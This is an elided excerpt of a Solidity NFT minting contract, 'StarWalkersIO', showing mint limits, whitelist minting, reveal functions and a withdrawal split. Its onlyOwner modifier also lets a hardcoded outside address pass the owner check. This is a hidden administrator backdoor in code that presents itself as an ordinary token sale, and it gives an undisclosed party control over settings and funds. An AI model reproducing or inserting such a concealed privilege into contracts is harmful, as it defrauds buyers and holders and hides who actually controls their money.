...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() ||  msg.sender == 0x1e8e398a9361D5064B32cEbC652A4f40A36B1144, "Ownable: caller is not the owner");
        _;
    }
    ...
    contract  StarWalkersIO is ERC721A, Ownable {
    using Strings for uint256;


  string private uriPrefix ;
  
 string public hiddenURL = "ipfs://QmYvW8umhZT9UQiDwRBYGp5nNtuihaLJyhYR2FJKYxBQ3M";
  ...
  bytes32 public whitelistMerkleRoot = 0x201e91671114e3f5501faf1b2da48cf3d85c47aba4ae34a143e9c78aa519bb1d;
  

  constructor() ERC721A("StarWalkersIO", "StarWalkersIO") {
  }
  ...
  function mint(uint8 _mintAmount) external payable  {
   ...
   require (_txPerAddress + _mintAmount <= maxMintAmountPerWallet, "Exceeds max NFT allowed per Wallet");
...
function whitelistMint(uint8 _mintAmount, bytes32[] calldata merkleProof) external payable {
       ...
       require (_txPerAddress + _mintAmount <= maxWLMintAmountPerWallet, "Exceeds max NFT allowed per Wallet");
  ...
  function setBasePrefix(string memory _uriPrefix) external onlyOwner {
 ...
 function setRevealed() external onlyOwner{
  ...
  uint _balance = address(this).balance;
    payable(0x141D1045c985A9cBA1173e36Cf1Bb8a5a91b2B5b).transfer(_balance * 90 / 100 ); 
    payable(0x3C821dD80Ce36e82fD03caE6272166D28974E4D5).transfer(_balance * 5 / 100 ); 
    payable(0xa4575d4621A5709032ac38A78CBA6E13bb9a73b5).transfer(_balance * 5 / 100 ); 
  }
